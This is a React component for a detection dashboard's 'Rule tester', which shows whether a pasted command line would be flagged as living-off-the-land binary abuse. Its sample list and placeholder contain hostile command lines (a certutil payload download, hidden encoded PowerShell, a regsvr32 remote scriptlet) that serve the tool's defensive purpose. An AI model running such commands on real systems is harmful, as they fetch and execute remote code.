import { useState } from "react";
import { useMutation } from "@tanstack/react-query";
import { CornerDownLeft, ShieldAlert, ShieldCheck } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { HighlightedCommand } from "@/components/common/HighlightedCommand";
import { Panel } from "@/components/common/Panel";
import { SeverityBadge } from "@/components/alerts/AlertBadges";
import { api, errorMessage } from "@/lib/api";
import { cn } from "@/lib/utils";
import type { RuleTestResult } from "@/types";

// Sample command lines for the tester. They are only analysed by the backend, never executed.
const EXAMPLES: ReadonlyArray<{ label: string; command: string }> = [
  { label: "certutil download", command: "certutil.exe -urlcache -split -f http://192.0.2.10/payload.exe payload.exe" },
  { label: "encoded PowerShell", command: "powershell.exe -nop -w hidden -enc SQBFAFgAKAAuAC4A" },
  { label: "regsvr32 scriptlet", command: "regsvr32.exe /s /u /i:http://192.0.2.10/a.sct scrobj.dll" },
  { label: "benign certutil", command: "certutil.exe -hashfile report.pdf SHA256" },
];

const RuleTester = () => {
  const [command, setCommand] = useState("");

  const mutation = useMutation({
    mutationFn: (value: string) => api.testRule(value),
  });

  const run = () => {
    const trimmed = command.trim();
    if (trimmed) mutation.mutate(trimmed);
  };

  const result = mutation.data;

  return (
    <Panel
      title="Rule tester"
      description="Paste a command line to see how the detector would classify it. Nothing is executed."
    >
      <Textarea
        value={command}
        onChange={(event) => setCommand(event.target.value)}
        onKeyDown={(event) => {
          if (event.key === "Enter" && (event.metaKey || event.ctrlKey)) run();
        }}
        placeholder="e.g. certutil.exe -urlcache -f http://example/payload.exe"
        spellCheck={false}
        className="min-h-[84px] resize-y font-mono text-xs"
      />

      <div className="mt-2 flex flex-wrap items-center gap-1.5">
        <span className="mr-1 text-2xs text-muted-foreground">Examples</span>
        {EXAMPLES.map((example) => (
          <button
            key={example.label}
            type="button"
            onClick={() => setCommand(example.command)}
            className="rounded border px-2 py-1 text-2xs text-muted-foreground transition-colors hover:bg-accent hover:text-foreground"
          >
            {example.label}
          </button>
        ))}
        <Button size="sm" className="ml-auto" onClick={run} disabled={!command.trim() || mutation.isPending}>
          {mutation.isPending ? "Testing…" : "Test"}
          <CornerDownLeft />
        </Button>
      </div>

      {mutation.isError && (
        <p className="mt-3 text-xs text-sev-critical">{errorMessage(mutation.error, "Could not test the command")}</p>
      )}

      {result && <RuleTestOutput result={result} command={command.trim()} />}
    </Panel>
  );
};

const RuleTestOutput = ({ result, command }: { result: RuleTestResult; command: string }) => {
  const detected = result.matched;

  return (
    <div className="mt-4 rounded-lg border">
      <div
        className={cn(
          "flex items-center gap-2.5 border-b px-4 py-3",
          detected ? "bg-sev-critical/10" : "bg-ok/10"
        )}
      >
        {detected ? <ShieldAlert className="h-4 w-4 text-sev-critical" /> : <ShieldCheck className="h-4 w-4 text-ok" />}
        <div className="flex-1">
          <div className="text-[13px] font-medium">
            {detected ? "Would be flagged" : result.known_binary ? "Would not be flagged" : "Not a monitored binary"}
          </div>
          <div className="text-2xs text-muted-foreground">
            {result.known_binary
              ? <>Binary <span className="font-mono text-foreground/80">{result.binary}</span> is a known LOLBin</>
              : <>Binary <span className="font-mono text-foreground/80">{result.binary}</span> has no detection rule</>}
          </div>
        </div>
        {result.severity && <SeverityBadge severity={result.severity} />}
      </div>

      <div className="space-y-3 p-4">
        <HighlightedCommand command={command} patterns={result.patterns_matched} />
        {result.patterns_matched.length > 0 && (
          <div className="flex flex-wrap items-center gap-1.5">
            <span className="mr-1 text-2xs text-muted-foreground">Matched patterns</span>
            {result.patterns_matched.map((pattern) => (
              <code key={pattern} className="rounded border border-sev-high/30 bg-sev-high/10 px-1.5 py-0.5 font-mono text-2xs text-sev-high">
                {pattern}
              </code>
            ))}
          </div>
        )}
        {result.rule?.mitre_attack_id && (
          <div className="text-2xs text-muted-foreground">
            Technique <span className="font-mono text-foreground/80">{result.rule.mitre_attack_id}</span>
            {" · "}
            {result.rule.description}
          </div>
        )}
      </div>
    </div>
  );
};

export default RuleTester;
